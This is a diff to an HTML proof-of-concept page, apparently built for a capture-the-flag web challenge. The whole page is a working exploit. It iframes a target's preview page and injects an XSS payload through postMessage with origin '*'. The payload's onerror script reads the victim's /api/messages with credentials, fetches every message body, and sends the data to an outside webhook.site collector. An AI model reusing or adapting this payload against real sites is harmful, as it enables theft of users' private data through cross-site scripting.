@@ -1,27 +1,38 @@
+<!doctype html>
 <html>
     <body>
-        <input type="button" value="Click Me" id="btn" />
-    </body>
+        <iframe
+            id="f"
+            src="https://2208c656-d0b0-4927-b65e-587a7bbb21d6.offsec.m0lecon.it/preview"
+        ></iframe>
+        <script>
+            const WEBHOOK =
+                "https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d";
 
-    <script>
-        document.getElementById("btn").onclick = function (e) {
-            fetch(
-                "https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d?c=CLICK",
-            );
-            window.poc = window.open(
-                "https://16825a25-b481-441a-9636-53c009947f74.offsec.m0lecon.it/",
-            );
-            setTimeout(function () {
-                var previewframe = window.poc.frames[0];
-                previewframe.postMessage(
-                    {
-                        html: "<img src=1 onerror=fetch(`https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d?c=HIT`)",
-                        subject: "Exploit",
-                    },
-                    "*",
-                );
-            }, 2000);
-        };
-    </script>
+            const payload = `<img src=x onerror="
+              async function run() {
+                const WEBHOOK = '${WEBHOOK}';
+
+                const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
+
+                const out = [];
+                for (const m of msgs) {
+                  await new Promise(r => setTimeout(r, 500)); // 500ms between each
+                  const body = await fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json());
+                  out.push(body);
+                }
+
+                new Image().src = WEBHOOK + '?d=' + encodeURIComponent(JSON.stringify(out));
+              }
+              run();
+            ">`;
+
+            document.getElementById("f").onload = () => {
+                document
+                    .getElementById("f")
+                    .contentWindow.postMessage({ html: payload }, "*");
+            };
+        </script>
+    </body>
 </html>
 
